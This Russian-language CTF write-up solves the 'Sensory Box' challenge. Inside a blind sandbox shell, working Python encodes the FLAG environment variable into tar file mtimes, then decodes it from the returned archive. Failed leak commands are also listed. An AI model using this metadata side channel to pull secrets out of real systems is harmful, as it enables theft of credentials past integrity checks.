# Sensory Box — утечка флага через метаданные tar

[English version](solve.md)

## 1. Разбор игры и исходника

После kCTF PoW запускаются шесть раундов. Число граней кости берётся через `secrets.randbelow`, максимумы: `[10, 1000, 10000, 100000, 65535, 2**32-1]`. За правильный ответ сервер выдаёт одноразовый `AGE-SECRET-KEY-...`, открывающий одну из шести зашифрованных частей флага.

Флаг читается из переменной окружения `FLAG`, делится на шесть срезов и шифруется через `age` в `/boxes/box_XX/prize.age`. В каждом каталоге также есть `dice.txt`. После раундов сервер возвращает base64 от `tar.xz` с этими 12 файлами.

Главная находка в `sensory_box.py`:

```python
proc = subprocess.Popen(
    ["/bin/sh"],
    stdout=subprocess.DEVNULL if not DEBUG else None,
    stderr=subprocess.DEVNULL if not DEBUG else None,
    cwd=box_path(dice),
    close_fds=True,
    process_group=0,
)
```

Во время трёх секунд после `GO!` запускается настоящий shell. Он наследует stdin и переменную `FLAG`, но stdout/stderr уходят в `/dev/null`. Поэтому команды исполняются «вслепую». После закрытия shell сервер вычитывает оставшийся stdin; вводить догадки заранее бессмысленно.

## 2. Проверяем выполнение и целостность

Команда `touch pwned` вызывала предупреждение:

```text
Hey, thief, give me my dice back!
```

То есть команды исполняются, но изменения файлов замечают. Исходник содержит:

```python
def get_boxes_content():
    return subprocess.check_output(
        "find /boxes -type f | sort | xargs sha256sum", shell=True
    )

boxes_content = get_boxes_content()
# после шести раундов
if boxes_content != get_boxes_content():
    print("Hey, thief, give me my dice back!")
    exit(1)
```

Проверяются **имена и SHA-256 содержимого**, а не mtime. Если изменить байты или добавить файл, архив не выдадут; но `os.utime` изменяет только метаданные.

Финальная выдача:

```python
tarball = subprocess.check_output(["tar", "cJ"] + files)
print(base64.b64encode(tarball).decode())
```

Tar хранит timestamp в заголовке каждого файла. Это и есть канал передачи данных наружу.

## 3. Кодируем переменную FLAG в mtime

Есть 12 файлов: шесть `dice.txt` и шесть `prize.age`. В `mtime` каждого кодируем четыре байта флага как unsigned big-endian; общая ёмкость **48 байт**, а настоящий флаг имел 40 байт:

```python
import os

paths = [f"/boxes/box_{i:02d}/dice.txt" for i in range(1, 7)]
paths += [f"/boxes/box_{i:02d}/prize.age" for i in range(1, 7)]
flag = os.environ["FLAG"].encode()

for i, path in enumerate(paths):
    chunk = flag[4*i:4*i+4].ljust(4, b"\0")
    os.utime(path, (0, int.from_bytes(chunk, "big")))
```

Этот Python-код передаётся как heredoc `python3 - <<'PY'` в первый shell сразу после `GO!`. Исходный успешный скрипт отводил около 2.5 с перед следующим этапом.

Перед этим аналогичным способом записали тестовые маркеры `1000000+i`: все двенадцать mtime без повреждений появились в финальном tar. То есть побочный канал экспериментально проверили отдельно от чтения секрета.

## 4. Считываем архив после шести неверных ответов

После трёхсекундного окна каждый раз ждём `What is your guess?` и отправляем `0`. Ключи age не нужны — архив выдают независимо от правильности угадывания, если хеши файлов не изменены.

Полученный bundle декодируем через base64 → xz → tar. Читаем `TarInfo.mtime` для каждого файла, сопоставляя **по полному имени**, а не порядку tar-записей:

```python
import base64, io, lzma, tarfile

tar_bytes = lzma.decompress(base64.b64decode(encoded_bundle))
with tarfile.open(fileobj=io.BytesIO(tar_bytes)) as archive:
    mtimes = {member.name: member.mtime for member in archive}

paths = [f"boxes/box_{i:02d}/dice.txt" for i in range(1, 7)]
paths += [f"boxes/box_{i:02d}/prize.age" for i in range(1, 7)]
flag = b"".join(mtimes[p].to_bytes(4, "big") for p in paths).rstrip(b"\0")
```

Первоначальный декодер ошибочно считывал даты в порядке tar, где файлы чередуются по каталогам. Запись же шла «сначала все dice, потом все prize.age». После исправления порядка получили полный флаг. Последние восемь байт в канале заняты нулевым дополнением.

## 5. Отброшенные варианты

- Один раз успешно угадали первую шестигранную кость и расшифровали `box_01/prize.age`. Получили префикс **`gctf{70`**.
- Попытки вывести `age`-ключ из количества граней, хешей, KDF, seed Python RNG или номера сессии провалились. Для одинакового `n=6` наблюдали разные секретные ключи.
- Анализ времени `GO!` → prompt давал примерно 3.10 с и не помог восстановить число граней. Разовый 11-мс артефакт TCP не повторился.
- Первая идея из истории ChatGPT — `printf "$FLAG" >&0` — на реальном сервисе не работала. stdin не был выходным двунаправленным каналом. `/proc/$PPID/fd/1` также не помог; в nsjail задан `--disable_proc`.
- Изменения содержимого и создание файлов вызывают предупреждение о краже; изменение mtime — нет.

## 6. Итог и доказательства

В частном `glacierctf_sensory_box_materials.zip` есть оригинальный архив организаторов, точный успешный скрипт `scripts/leak_via_mtime2.py`, переносимая версия, проверочные скрипты и текстовый вывод финального запуска.

В сохранённой расшифровке первые два блока выглядят так:

```text
boxes/box_01/dice.txt 1734571110 b'gctf'
boxes/box_02/dice.txt 2067214453 b'{70u'
```

После объединения двенадцати блоков восстановлены все **40 байт** флага `gctf{...}`. Флаг в GitHub замаскирован.

**В отчёте агента прямо сказано, что флаг не отправляли на платформу и принятие не подтверждено.** Поэтому здесь фиксируется получение настоящего флага из удалённого сервиса, а не вымышленное подтверждение сдачи. Оригинальный итоговый tar отдельно не сохранился, но есть транскрипт декодирования.

## 7. Вывод

Вместо предполагаемой песочницы сервис дал слепую командную оболочку с секретом в окружении. Запрет stdout и хеширование содержимого не закрыли побочный канал через метаданные. При формировании tar сервис сериализовал attacker-controlled `mtime` и тем самым вынес `FLAG` наружу.
